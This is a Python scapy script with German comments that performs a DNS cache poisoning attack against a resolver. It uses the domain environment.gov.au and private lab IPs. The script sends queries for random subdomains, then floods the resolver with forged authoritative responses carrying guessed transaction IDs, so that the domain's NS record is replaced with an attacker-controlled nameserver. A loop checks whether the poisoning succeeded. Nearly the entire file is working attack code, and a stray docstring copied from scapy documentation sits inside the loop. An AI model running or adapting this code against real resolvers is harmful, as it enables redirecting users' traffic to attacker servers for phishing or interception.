#! /usr/bin/env python
#from scapy.all import IP, UDP, DNS, sendpfast, send, DNSQR
from scapy.all import *
import threading, socket



bad_guy = '192.168.1.229'          # unsere ip addresse (fuer anfrage)
fake_ns_server = '192.168.1.246'   # das was wir dem cache infizieren wollen

victim_url = 'environment.gov.au' # url dessen cache gepoisened werden soll
victim_ns = '192.168.1.2'         # nameserver der angegeriffen wird
fix_port = 32772

dns_ttl = 60*60*24*15
dns_qd_ns=DNSQR(qname=victim_url,qtype='NS',qclass='IN')    # querry data fuer die zone_ns anfrage


#dynamisch ermittelt:
global zone_ns
global zone_ns_url

def sendRequest():
    
    set_ns(victim_url)
    tmp = random.randint(1, 2**16)
    
    while ( True ):
        rand_id = random.randint(0, 2**16)
        tmp=tmp+1
        
        dns_qd=DNSQR(qname=str(tmp)+'.'+victim_url,qtype='A',qclass='IN') # anfrage an den nameserver
        
        request = Ether()/IP(dst=victim_ns,src=bad_guy,flags=2)/UDP(dport=53,sport=53)/DNS(id=1337,qr=0,rd=1,qd=dns_qd)
        ip = Ether()/IP(dst=victim_ns, src=zone_ns_url)/UDP(dport=fix_port, sport=53)
        pkt_list=[]
        pkt_list.append(request)
        print 'Cache Poisoning auf '+victim_url+' ...'
        for i in range(100):
            rand_id = (rand_id+1)%2**16
            pkt_list.append(ip/DNS(id=rand_id,rd=0, ra=0, qr=1, aa=1, qd=dns_qd, ns = DNSRR(type='NS',rrname=victim_url, ttl=dns_ttl, rdata='rapunzel.'+victim_url),ar=DNSRR(type='A',rrname='rapunzel.'+victim_url, ttl=dns_ttl, rdata=fake_ns_server)))

        sendpfast(pkt_list, loop=0, pps=250)

        set_ns(victim_url)
        
        if zone_ns!=fake_ns_server:
            print 'Angriff noch nicht erfolgreich, neue Subdomain'
        if zone_ns==fake_ns_server:
            print '1. Angriff erfolgreich'
            print '2. ???'
            print '3. Profit!!!'
            break
        #if zone_ns!=target_ip:
        #    print 'Angriff fehlgeschlagen, korrekte IP gecached'
        #    break

    	"""Send packets at layer 2 using tcpreplay for performance
    pps:  packets per second
    mbps: MBits per second
    realtime: use packet's timestamp, bending time with realtime value
    loop: number of times to process the packet list
    file_cache: cache packets in RAM instead of reading from disk at each iteration
    iface: output interface """

	      
def set_ns(url):
    global zone_ns
    global zone_ns_url
    #return 0 falls wenn nichts im Cache
    #return 1 falls der Cache erfolgreich vergiftet wurde
    #return 2 falls bereits ein Cache eintrag vorliegt
    antwort_pkt =sr1( IP(dst=victim_ns,src=bad_guy,flags=2)/UDP(dport=53,sport=53)/DNS(id=1337,qr=0,qd=dns_qd_ns, rd=1) )
    adns=antwort_pkt.getlayer(DNS)
    #adns.show()
    if adns.ar != None:
        for f in adns.ar:            
            zone_ns = f.rdata
            zone_ns_url = f.rrname

if __name__ == '__main__':
    sendRequest()

